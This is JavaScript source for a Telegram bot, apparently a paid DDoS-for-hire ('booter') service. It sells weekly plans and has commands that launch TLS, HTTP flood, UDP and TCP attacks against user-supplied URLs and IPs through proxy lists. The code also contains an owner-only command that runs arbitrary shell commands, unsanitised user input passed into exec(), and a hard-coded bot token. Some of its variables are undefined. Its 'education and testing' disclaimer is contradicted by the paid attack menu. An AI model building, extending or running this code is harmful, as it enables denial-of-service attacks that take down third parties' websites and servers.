// PeeX Telegram Bot DDoS Version 1.1
// Whats New? 
// Fixed Error Cannot Run And Added Methods 
// Please Give Credit If Recode

const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const { exec } = require('child_process');

const bot = new TelegramBot('8400441175:AAGu8M5rn28udlF5mQccbOLYybcbS-wNiWA', { polling: true });

let plans = JSON.parse(fs.readFileSync('plans.json', 'utf8'));

const owner_id = '8433572233';

const isOwner = (chatId) => chatId.toString() === owner_id;

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username;

    if (!plans[chatId]) {
        plans[chatId] = { plan: 'member', maxTime: 120, referralCount: 0 };
        fs.writeFileSync('plans.json', JSON.stringify(plans));
    }
    
    const userPlans = plans[chatId];
    const response = `
[   Welcome  On   YourBotName     ]
 -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 ➡️ Information About You @${username}
 🐼 Username : @${username}
 📡 Network : Normal 
 💎 Plans : ${userPlans.plan}
 🕛 Maxtime : ${userPlans.maxTime} Seconds
=============================
[       Main   -    - Menu           ]
══─══─══─══─══─══─══─══
|  1.  /info < For Get Info On This Bot >
|  2.  /methods < Show All Methods >
|  3.  /cek < For Cek Info Server Running >
|  4.  /plans < Show Plans Info >
|  5.  /ownermenu  < Show Owner Menu >
|  6.  /vipmenu < Show Vip Menu >
|  7.  /basicmenu < Show Basic Menu >
|  8.  /freemenu < Show Free Menu >
══─══─══─══─══─══─══─══
`;

    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🔱 Owner 🔱', url: 'https://t.me/lo_poo' }],
                [{ text: '💎 Buy Plans 💎', url: 'https://t.me/lo_poo' }]
            ]
        }
    };

    bot.sendMessage(chatId, response, options);
});

bot.onText(/\/info/, (msg) => {
    const chatId = msg.chat.id;
    const response = `
⬅️⬅️⬅️⬅️⬅️   Information On Bot   ➡️➡️➡️➡️➡️
❗ This Bot Created By PallxMods ❗
❌ Don't Use Bot For DDoS Any Server Must Have Permission
This Bot Created For Education And For Testing Your DDoS Protection On Your Site 
📡 Server Connected On Bot: 1 
`;

    bot.sendMessage(chatId, response);
});

bot.onText(/\/methods/, (msg) => {
    const chatId = msg.chat.id;

    const methodsList = fs.readdirSync('./lib').map((file, index) => `[] ${index + 1}. ${file}`).join('\n');

    const response = `══─══─══─══─══─══─══─══
❗ Information About Methods On Bot ❗
${methodsList}
═══════`;

    bot.sendMessage(chatId, response);
});

bot.onText(/\/cek/, (msg) => {
    const chatId = msg.chat.id;
    const response = `
~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
🟢 Server Information 🟢
📡 Connected On : ${process.platform}
🌐 Server Network Online : 1
🚀 Runtime : ${process.uptime()} Second
~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~
`;

    bot.sendMessage(chatId, response);
});

bot.onText(/\/plans/, (msg) => {
    const chatId = msg.chat.id;
    const response = `
══─══─══─══─══─══─══─══ 
🎟️ Vip = 10.000 IDR / Weeks 
🔰 Basic = 5.000 IDR / Weeks 
🗿 Member = Free / All Time
➡️ Information About Vip Plans 
✅ Get Maxtime 460 Second
✅ Get Access All Methods 
✅ Get Max Access Bot 5x Attack / Hours
✅ Get Access Get Proxy.txt

➡️ Information About Basic Plans
✅ Get Maxtime 320 Second 
❌ Get Access All Methods
✅ Get Max Access Bot 3x Attack / Hours
❌ Get Access Get Proxy.txt

➡️ Information About Member Plans / Free Plans
✅ Get Maxtime 120 Second
❌ Get Access All Methods 
✅ Get Max Access Bot 1x Attack / Hours
❌ Get Access Get Proxy.txt
══─══─══─══─══─══─══─══
`;

    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '💎 Buy Plans 💎', url: 'https://t.me/lo_poo' }],
                [{ text: '🔱 Owner 🔱', url: 'https://t.me/lo_poo' }]
            ]
        }
    };

    bot.sendMessage(chatId, response, options);
});

bot.onText(/\/ownermenu/, (msg) => {
    const chatId = msg.chat.id;

    if (!isOwner(chatId)) {
        return bot.sendMessage(chatId, '❌ You are not the owner of the bot.');
    }

    const response = `
══─══─══─══─══─══─══─══
🔱     OWNER MENU      🔱
 🔨 /addplans < for add plans user >
 🔨 /ban < for ban user >
 🔨 /delplans < for delete plans user >
 🔨 /bl < for blacklist user >
 🔨 /broadcast < for send broadcast message >
 🔨 /qc < for send promotion text >
 🔨 /addtime < for add time user >
 🔨 /scrape < for add proxy on proxy.txt >
 🔨 /db < for access database.json >
══─══─══─══─══─══─══─══
`;

    bot.sendMessage(chatId, response);
});

bot.onText(/\/addplans (.+)/, (msg, match) => {
    const chatId = msg.chat.id;

    if (!isOwner(chatId)) {
        return bot.sendMessage(chatId, '❌ You are not the owner of the bot.');
    }

    const args = match[1].trim().split(' ');

    if (args.length !== 3) {
        return bot.sendMessage(chatId, "😄 Please Usage: /addplans <id> <type> <duration>\n🔧 Example: /addplans 718218 vip 1Week");
    }

    const [id, type, duration] = args;

    if (!['vip', 'basic', 'member'].includes(type)) {
        return bot.sendMessage(chatId, "❌ Invalid plan type. Must be 'vip', 'basic', or 'member'.");
    }

    plans[id] = { plan: type, maxTime: duration === '1Year' ? 460 : duration === '1Month' ? 320 : 120, referralCount: 0 };
    fs.writeFileSync('plans.json', JSON.stringify(plans));

    bot.sendMessage(chatId, `✅ Successfully added user ${id} to plans as ${type} for ${duration}.`);
});

bot.onText(/\/ban (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userIdToBan = match[1].trim();

    if (!isOwner(chatId)) {
        return bot.sendMessage(chatId, '❌ You are not the owner of the bot.');
    }

    if (!userIdToBan) {
        return bot.sendMessage(chatId, "❌ Please provide a valid user ID to ban.\n🔧 Usage: /ban <user_id>");
    }

    if (plans[userIdToBan]) {
        delete plans[userIdToBan];
        fs.writeFileSync('plans.json', JSON.stringify(plans));
        bot.sendMessage(chatId, `✅ User with ID ${userIdToBan} has been banned successfully.`);
    } else {
        bot.sendMessage(chatId, `❌ No user found with ID ${userIdToBan}.`);
    }
});

bot.onText(/\/delplans (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userIdToDelete = match[1].trim();

    if (!isOwner(chatId)) {
        return bot.sendMessage(chatId, '❌ You are not the owner of the bot.');
    }

    if (!userIdToDelete) {
        return bot.sendMessage(chatId, "❌ Please provide a valid user ID to delete plans.\n🔧 Usage: /delplans <user_id>");
    }

    if (plans[userIdToDelete]) {
        delete plans[userIdToDelete];
        fs.writeFileSync('plans.json', JSON.stringify(plans));
        bot.sendMessage(chatId, `✅ Plans for user ID ${userIdToDelete} have been deleted successfully.`);
    } else {
        bot.sendMessage(chatId, `❌ No plans found for user ID ${userIdToDelete}.`);
    }
});

bot.onText(/\/db/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId == owner_id) {
        bot.sendDocument(chatId, dbPath);
    }
});

bot.onText(/\/addtime/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId == owner_d) {
        const args = match.input.split(' ').slice(1);
        if (args.length !== 2) {
            return bot.sendMessage(chatId, `😄 Please Usage : /addtime <id> <duration> \n🔧 Example : /addtime 71121 20`);
        }

        const [id, duration] = args;
        if (plans[id]) {
            plans[id].maxtime += parseInt(duration);
            updateJsonFile();
            bot.sendMessage(chatId, `✅ Succes Add Time To ${id}`);
        } else {
            bot.sendMessage(chatId, `❌ ID not found.`);
        }
    }
}); 

bot.onText(/\/tls (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1].split(' ');

    if (!plans[chatId] || plans[chatId].maxTime <= 0) {
        if (!isOwner(chatId)) {
            return bot.sendMessage(chatId, '❌ You do not have enough time to perform an attack. Please wait until it resets.');
        }
    } 

    if (args.length !== 4) {
        return bot.sendMessage(chatId, "🔧 Please Usage: /tls <url> <thread> <req> <time>");
    }
    
    const [url, thread, req, time] = args;

    const userPlan = plans[chatId].plan;
    const maxTime = userPlan === 'vip' ? 460 : userPlan === 'basic' ? 320 : 120;

    if (plans[chatId].maxTime < time && !isOwner(chatId)) {
        return bot.sendMessage(chatId, `❌ You cannot use more time than your allowance.`);
    }

    exec(`node ./lib/tls.js ${url} ${thread} ${req} ${time} proxy.txt`, (error, stdout, stderr) => {
        if (error) {
            console.error(`exec error: ${error}`);
            return;
        }
        bot.sendMessage(chatId, `✅ <> Started Attack On ${url} For ${time} Seconds <>`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '➡️ Check Host', url: `https://check-host.net/check-http?host=${url}&csrf_token=` }]
                ]
            }
        });
    });

    if (!isOwner(chatId)) {
        plans[chatId].maxTime -= time;
        fs.writeFileSync('plans.json', JSON.stringify(plans));
    }
});

bot.onText(/\/rapid (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1].split(' ');

    if (!plans[chatId] || plans[chatId].maxTime <= 0) {
        if (!isOwner(chatId)) {
            return bot.sendMessage(chatId, '❌ You do not have enough time to perform an attack. Please wait until it resets.');
        }
    }

    if (args.length !== 4) {
        return bot.sendMessage(chatId, "🔧 Please Usage: /rapid <url> <thread> <req> <time>");
    }
    
    const [url, thread, req, time] = args;

    exec(`node ./lib/rapid.js ${url} ${thread} ${req} ${time} proxy.txt`, (error, stdout, stderr) => {
        if (error) {
            console.error(`exec error: ${error}`);
            return;
        }
        bot.sendMessage(chatId, `✅ <> Started Attack On ${url} For ${time} Seconds <>`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '➡️ Check Host', url: `https://check-host.net/check-http?host=${url}&csrf_token=` }]
                ]
            }
        });
    });
});

bot.onText(/\/scrape/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId == owner_id) {
        bot.sendMessage(chatId, `🔨 Melakukan Penambahan Proxy Ke Proxy.txt 😄`,)
            .then(() => {
                require('child_process').exec('node lib/scrape.js', (err, stdout, stderr) => {
                    if (err) {
                        return bot.sendMessage(chatId, `❌ Error occurred:\n${stderr}`);
                    }
                    bot.sendMessage(chatId, `✅ Proxy added successfully.`);
                });
            });
    }
});

bot.onText(/\/exe (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (userId !== owner_d) {
    bot.sendMessage(chatId, '❗ This command is only available for the owner!');
    return;
  }
  const command = match[1];
  exec(command, (error, stdout, stderr) => {
    if (error) {
      bot.sendMessage(chatId, `❌ Error executing command: ${error.message}`);
      return;
    }
    if (stderr) {
      bot.sendMessage(chatId, `❌ stderr: ${stderr}`);
      return;
    }
    const result = `\`\`\`\n${stdout}\n\`\`\``;
    bot.sendMessage(chatId, result, { parse_mode: 'MarkdownV2' });
  });
});

bot.onText(/\/gorila (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1].split(' ');

    if (!plans[chatId] || plans[chatId].maxTime <= 0) {
        if (!isOwner(chatId)) {
            return bot.sendMessage(chatId, '❌ You do not have enough time to perform an attack. Please wait until it resets.');
        }
    }

    if (args.length !== 4) {
        return bot.sendMessage(chatId, "🔧 Please Usage: /gorila <url> <time>");
    }
    
    const [url, thread, req, time] = args;

    exec(`node ./lib/gorila.js ${url} ${time}`, (error, stdout, stderr) => {
        if (error) {
            console.error(`exec error: ${error}`);
            return;
        }
        bot.sendMessage(chatId, `✅ <> Started Attack On ${url} For ${time} Seconds <>`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '➡️ Check Host', url: `https://check-host.net/check-http?host=${url}&csrf_token=` }]
                ]
            }
        });
    });
});

bot.onText(/\/udp (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1].split(' ');

    if (!plans[chatId] || plans[chatId].maxTime <= 0) {
        if (!isOwner(chatId)) {
            return bot.sendMessage(chatId, '❌ You do not have enough time to perform an attack. Please wait until it resets.');
        }
    }

    if (args.length !== 3) {
        return bot.sendMessage(chatId, "❗ Please Usage: /udp <ip> <port> <time>");
    }
    
    const [ip, port, time] = args;

    exec(`node ./lib/udp.js ${ip} ${port} ${time} proxy.txt`, (error) => {
        if (error) {
            console.error(`exec error: ${error}`);
            return;
        }
        bot.sendMessage(chatId, `✅ <> Started UDP Attack On ${ip}:${port} For ${time} Seconds <>`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '➡️ Check Host', url: `https://check-host.net/check-udp?host=${ip}:${port}&csrf_token=` }]
                ]
            }
        });
    });
});

bot.onText(/\/tcp (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1].split(' ');

    if (!plans[chatId] || plans[chatId].maxTime <= 0) {
        if (!isOwner(chatId)) {
            return bot.sendMessage(chatId, '❌ You do not have enough time to perform an attack. Please wait until it resets.');
        }
    }

    if (args.length !== 3) {
        return bot.sendMessage(chatId, "❗ Please Usage: /tcp <ip> <port> <time>");
    }

    const [ip, port, time] = args;

    exec(`node ./lib/tcp.js ${ip} ${port} ${time} proxy.txt`, (error) => {
        if (error) {
            console.error(`exec error: ${error}`);
            return;
        }
        bot.sendMessage(chatId, `✅ <> Started TCP Attack On ${ip}:${port} For ${time} Seconds <>`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '➡️ Check Host', url: `https://check-host.net/check-tcp?host=${ip}:${port}&csrf_token=` }]
                ]
            }
        });
    });
});

bot.onText(/\/free-flood (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1].split(' ');

    if (args.length !== 2) {
        return bot.sendMessage(chatId, "🔧 Please Usage: /free-flood <url> <time>");
    }
    
    const [url, time] = args;

    exec(`node ./lib/free.js ${url} ${time} proxy.txt`, (error) => {
        if (error) {
            console.error(`exec error: ${error}`);
            return;
        }
        bot.sendMessage(chatId, `✅ <> Started Free Flood Attack On ${url} For ${time} Seconds <>`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '➡️ Check Host', url: `https://check-host.net/check-http?host=${url}&csrf_token=` }]
                ]
            }
        });
    });
});

bot.on('polling_error', (error) => {
    console.error(error);
});